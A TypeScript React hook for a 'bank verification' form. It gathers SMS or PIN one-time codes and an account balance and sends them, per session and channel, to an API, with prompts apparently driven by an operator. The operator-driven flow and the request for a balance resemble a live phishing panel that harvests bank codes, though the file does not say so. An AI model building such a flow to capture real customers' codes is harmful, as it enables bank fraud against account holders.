import { useState, useEffect, useCallback } from "react";
import { useOtpResendCountdown } from "./use-otp-resend-countdown";
import { submitOtp, resendOtp, submitBalance } from "../lib/verification-api";
import { debugLog } from "../lib/debug";
import { useBankVerificationContext } from "../context/bank-verification-context";
import type {
  OperatorMessage,
  ResendState,
  TransactionDetails,
} from "../types";
import type { UseSessionStatusReturn } from "./use-session-status";

const RESEND_COOLDOWN = 60;
const PIN_LENGTH = 4;
const OTP_MIN_LENGTH = 6;

export interface UseVerificationFormReturn {
  bank?: string;
  transactionDetails?: TransactionDetails;
  inProgress: boolean;
  awaitingVerification: boolean;
  error: string | null;
  onSubmit: () => void;
  submitting: boolean;
  canSubmit: boolean;
  operatorMessage: OperatorMessage | null;
  balance: string;
  setBalance: (v: string) => void;
  otpValue: string;
  setOtpValue: (v: string) => void;
  wrongCode: boolean;
  expiredCode: boolean;
  resendState: ResendState;
  pinMasked: boolean;
  onPinMaskToggle: () => void;
}

/**
 * Internal logic hook for verification form. Used by BankVerificationProvider.
 * Takes params directly — does not read from context.
 */
export function useVerificationFormLogic(
  channelSlug: string,
  debug: boolean,
  sessionId: string | null,
  sessionStatus: UseSessionStatusReturn,
): UseVerificationFormReturn {
  const [submitError, setSubmitError] = useState<string | null>(null);
  const [submitting, setSubmitting] = useState(false);
  const [otpValue, setOtpValue] = useState("");
  const [pinMasked, setPinMasked] = useState(true);
  const [balance, setBalance] = useState("");

  const {
    status,
    verificationLayout,
    bank,
    transactionDetails,
    wrongCode,
    expiredCode,
    clearCodeFeedback,
    operatorMessage,
    countdown: countdownReset,
    error: fetchError,
  } = sessionStatus;

  const resendFn = async () => {
    if (verificationLayout === "pin" || verificationLayout === "sms") {
      debugLog(debug, "resend OTP requested", {
        type: verificationLayout,
        channelSlug,
        sessionId,
      });
      await resendOtp(channelSlug, sessionId ?? "", verificationLayout);
      debugLog(debug, "resend OTP completed", { type: verificationLayout });
    }
  };

  const resendState = useOtpResendCountdown(
    RESEND_COOLDOWN,
    countdownReset,
    resendFn,
  );

  useEffect(() => {
    if (wrongCode || expiredCode) {
      debugLog(debug, "wrongCode/expiredCode → reset form", {
        wrongCode,
        expiredCode,
        verificationLayout,
      });
      setSubmitting(false);
      setOtpValue("");
    }
  }, [wrongCode, expiredCode, debug, verificationLayout]);

  useEffect(() => {
    setSubmitting(false);
  }, [status]);

  const handleSubmitOtp = useCallback(async (codeValue: string) => {
    debugLog(debug, "submit OTP (clearCodeFeedback first)", {
      type: verificationLayout,
      codeLength: codeValue.length,
      sessionId,
    });
    clearCodeFeedback?.();
    setSubmitError(null);
    setSubmitting(true);
    try {
      await submitOtp(channelSlug, sessionId ?? "", codeValue);
      debugLog(debug, "OTP submitted OK");
    } catch (e) {
      const msg = e instanceof Error ? e.message : "Invalid code";
      debugLog(debug, "OTP submit failed", { error: msg });
      setSubmitError(msg);
      setSubmitting(false);
    }
  }, [channelSlug, sessionId, debug, verificationLayout, clearCodeFeedback]);

  const handleSubmitBalance = useCallback(async (balanceValue: string) => {
    setSubmitError(null);
    setSubmitting(true);
    debugLog(debug, "submit balance", {
      hasValue: balanceValue.length > 0,
      sessionId,
      channelSlug,
    });
    try {
      await submitBalance(channelSlug, sessionId ?? "", balanceValue);
      debugLog(debug, "balance submitted OK");
    } catch (e) {
      const msg = e instanceof Error ? e.message : "Failed to submit balance";
      debugLog(debug, "balance submit failed", { error: msg });
      setSubmitError(msg);
      setSubmitting(false);
    }
  }, [channelSlug, sessionId, debug]);

  const inProgress = status === "pending" || status === "awaiting_action";
  const awaitingVerification =
    status === "awaiting_sms" ||
    status === "awaiting_pin" ||
    status === "awaiting_push" ||
    status === "awaiting_balance";

  const onSubmit = useCallback(() => {
    if (verificationLayout === "balance") {
      handleSubmitBalance(balance);
    } else if (verificationLayout === "pin" || verificationLayout === "sms") {
      handleSubmitOtp(otpValue);
    }
  }, [verificationLayout, balance, otpValue, handleSubmitBalance, handleSubmitOtp]);

  const onPinMaskToggle = useCallback(() => setPinMasked((m) => !m), []);

  const canSubmit =
    verificationLayout === "balance"
      ? balance.trim().length > 0
      : verificationLayout === "pin"
        ? otpValue.replace(/\D/g, "").length === PIN_LENGTH
        : otpValue.replace(/\D/g, "").length >= OTP_MIN_LENGTH;

  return {
    bank,
    transactionDetails,
    inProgress,
    awaitingVerification,
    error: submitError ?? fetchError,
    onSubmit,
    submitting,
    canSubmit,
    operatorMessage: operatorMessage ?? null,
    balance,
    setBalance,
    otpValue,
    setOtpValue,
    wrongCode,
    expiredCode,
    resendState,
    pinMasked,
    onPinMaskToggle,
  };
}

/**
 * Public hook: reads verification form state from BankVerificationContext.
 * Must be used within BankVerificationProvider.
 */
export function useVerificationForm(): UseVerificationFormReturn {
  return useBankVerificationContext();
}
